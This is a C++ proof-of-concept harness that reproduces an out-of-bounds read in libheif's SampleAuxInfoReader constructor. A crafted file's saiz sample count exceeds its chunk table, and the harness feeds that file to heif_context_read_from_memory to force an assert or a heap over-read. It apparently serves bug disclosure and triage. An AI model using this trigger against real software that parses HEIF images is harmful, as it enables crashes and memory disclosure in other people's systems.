/*
 * poc_trigger.cc — OOB in SampleAuxInfoReader constructor (libheif bug 04)
 *
 * The crash occurs purely during file parsing: heif_context_read_from_memory()
 * triggers Track::load() -> SampleAuxInfoReader constructor, which iterates
 * nSamples from the saiz box past the end of the chunk vector, hitting an
 * assert (debug/ASAN builds) or heap OOB read (release builds).
 *
 * Usage:
 *   ./poc_trigger [poc_input]        (default: poc_input in current directory)
 *
 * Generate poc_input:
 *   python3 gen_poc.py
 *
 * Build:
 *   clang++ -fsanitize=address -fno-omit-frame-pointer -g -O1 \
 *       poc_trigger.cc -I<libheif_install>/include \
 *       -L<libheif_install>/lib -Wl,-rpath,<libheif_install>/lib \
 *       -lheif -o poc_trigger
 *
 * Expected: SIGABRT at track.cc:141 — assert(current_chunk < chunks.size())
 *   In release builds without assertions: heap-buffer-overflow READ past chunks vector.
 */

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <libheif/heif.h>

int main(int argc, char* argv[])
{
    const char* path = (argc > 1) ? argv[1] : "poc_input";

    FILE* f = fopen(path, "rb");
    if (!f) {
        fprintf(stderr, "[-] Cannot open '%s'\n", path);
        return 1;
    }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    rewind(f);
    if (sz <= 0) { fclose(f); fprintf(stderr, "[-] Empty file\n"); return 1; }

    unsigned char* data = (unsigned char*)malloc((size_t)sz);
    if (!data) { fclose(f); fprintf(stderr, "[-] malloc failed\n"); return 1; }
    fread(data, 1, (size_t)sz, f);
    fclose(f);

    fprintf(stderr, "[+] Loaded %ld bytes from '%s'\n", sz, path);
    fprintf(stderr, "[+] Calling heif_context_read_from_memory() ...\n");
    fprintf(stderr, "[+] Crash expected in SampleAuxInfoReader::SampleAuxInfoReader()\n");
    fprintf(stderr, "    -> track.cc:141  assert(current_chunk < chunks.size())\n");

    heif_context* ctx = heif_context_alloc();

    /*
     * The crash happens inside this call, deep in the parsing stack:
     *   heif_context_read_from_memory
     *   -> HeifContext::interpret_heif_file_sequences
     *   -> Track::load  (track.cc:447)
     *   -> SampleAuxInfoReader constructor  (track.cc:141)  <-- CRASH
     *
     * saiz declares 10 samples but stco/stsc only cover 4 samples across 2 chunks.
     * The constructor increments current_chunk past chunks.size() == 2.
     */
    heif_error err = heif_context_read_from_memory(ctx, data, (size_t)sz, nullptr);

    /* Should not reach here */
    fprintf(stderr, "[-] UNEXPECTED: no crash (err.code=%d: %s)\n",
            err.code, err.message ? err.message : "(null)");

    heif_context_free(ctx);
    free(data);
    return 0;
}
